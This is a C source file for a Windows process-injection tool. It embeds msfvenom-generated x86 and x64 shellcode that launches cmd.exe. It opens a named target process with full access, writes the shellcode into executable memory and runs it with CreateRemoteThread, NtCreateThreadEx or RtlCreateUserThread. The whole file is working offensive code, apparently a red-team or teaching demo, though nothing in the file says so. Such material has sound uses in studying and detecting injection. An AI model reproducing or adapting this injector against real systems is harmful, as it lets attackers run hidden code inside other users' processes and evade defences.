#include "stdafx.h"
#include "general.h"
#include <psapi.h>
#include <stdio.h>
#include <Windows.h>

#ifdef _X86_
typedef DWORD(WINAPI *prototype_NtCreateThreadEx)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN LPVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN LPTHREAD_START_ROUTINE lpStartAddress,
	IN LPVOID lpParameter,
	IN BOOL CreateSuspended,
	IN DWORD StackZeroBits,
	IN DWORD SizeOfStackCommit,
	IN DWORD SizeOfStackReserve,
	OUT LPVOID lpBytesBuffer
	);

//msfvenom -a x86 --platform windows -p windows/exec CMD="cmd.exe" EXITFUNC=thread -f c
unsigned char sc[] = 
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5"
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5\x63\x6d\x64\x2e\x65\x78\x65\x00";

#endif

#ifdef _WIN64
typedef DWORD(WINAPI *prototype_NtCreateThreadEx)(
	_Out_ PHANDLE ThreadHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_opt_ LPVOID ObjectAttributes,
	_In_ HANDLE ProcessHandle,
	_In_ PVOID StartRoutine,
	_In_opt_ PVOID Argument,
	_In_ ULONG CreateFlags,
	_In_opt_ ULONG_PTR ZeroBits,
	_In_opt_ SIZE_T StackSize,
	_In_opt_ SIZE_T MaximumStackSize,
	_In_opt_ PVOID AttributeList
	);

//msfvenom -a x64 --platform windows -p windows/x64/exec CMD="cmd.exe" EXITFUNC=thread -f c
unsigned char sc[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64"
"\x2e\x65\x78\x65\x00";
#endif

typedef DWORD(WINAPI *prototype_RtlCreateUserThread)(
	HANDLE      ProcessHandle,
	PSECURITY_DESCRIPTOR  SecurityDescriptor,
	BOOL      CreateSuspended,
	ULONG     StackZeroBits,
	PULONG     StackReserved,
	PULONG     StackCommit,
	LPVOID     StartAddress,
	LPVOID     StartParameter,
	HANDLE      ThreadHandle,
	LPVOID     ClientID
	);

int wmain(int argc, wchar_t**argv) //to read in arguments as unicode
{
	if (argc != 3)
	{
		printf("Usage: SimpleThreadInjection.exe [process name] [option number]\noption 1 - CreateRemoteThread\noption 2 - NtCreateThreadEx\noption 3 - RtlCreateUserThread\n");
		return -1;
	}

	int option = _wtoi(argv[2]);
	if (option != 1 && option != 2 && option != 3)
	{
		printf("[-] Wrong option number\n");
		ExitProcess(-1);
	}

	//find the process ID by name
	DWORD pid = FindPIDByName(argv[1]);
	printf("[+] PID is: %d,0x%x\n", (UINT)pid, (UINT)pid);

	//open process with all access
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL)
	{
		//printf("[-] Couldn't open process, exiting...\n");
		//return -1;
		ErrorExit(TEXT("OpenProcess"));
	}
	printf("[+] Process handle: 0x%x\n", (UINT)hProcess);

	//allocate memory in target process
	LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (lpBaseAddress == NULL)
	{
		ErrorExit(TEXT("VirtualAllocEx"));
	}
	printf("[+] Allocated memory address in target process is: 0x%Ix\n", (SIZE_T)lpBaseAddress);


	//write SC to target process
	SIZE_T *lpNumberOfBytesWritten = 0;
	BOOL resWPM = WriteProcessMemory(hProcess, lpBaseAddress, (LPVOID)sc, sizeof(sc), lpNumberOfBytesWritten);
	if (!resWPM)
	{
		ErrorExit(TEXT("WriteProcessMemory"));
	}
	printf("[+] Shellcode is written to memory of target process\n");


	//start remote thread in target process
	HANDLE hThread = NULL;
	DWORD ThreadId = 0;

	switch (option)
	{
		//option 1: CreateRemoteThread
	case 1:
	{
		hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpBaseAddress, NULL, 0, (LPDWORD)(&ThreadId));
		if (hThread == NULL)
		{
			ErrorExit(TEXT("CreateRemoteThread"));
		}
		break;
	}
	//option 2: NtCreateThreadEx
	case 2:
	{
		prototype_NtCreateThreadEx pfnNtCreateThreadEx = NULL;
		GetFunctionAddressFromDll("ntdll.dll", "NtCreateThreadEx", (PVOID *)&pfnNtCreateThreadEx);

		pfnNtCreateThreadEx(&hThread, GENERIC_ALL, NULL, hProcess, (LPTHREAD_START_ROUTINE)lpBaseAddress, NULL, NULL, NULL, NULL, NULL, NULL);
		if (hThread == NULL)
		{
			ErrorExit(TEXT("NtCreateThreadEx"));
		}
		break;
	}
	//option 3: RtlCreateUserThread
	case 3:
	{
		prototype_RtlCreateUserThread pfnRtlCreateUserThread = NULL;
		GetFunctionAddressFromDll("ntdll.dll", "RtlCreateUserThread", (PVOID *)&pfnRtlCreateUserThread);

		pfnRtlCreateUserThread(hProcess, NULL, 0, 0, 0, 0, lpBaseAddress, NULL, &hThread, NULL);
		if (hThread == NULL)
		{
			ErrorExit(TEXT("RtlCreateUserThread"));
		}
		break;
	}
	}

	printf("[+] Successfully started SC in target process\n");

	return 0;
}

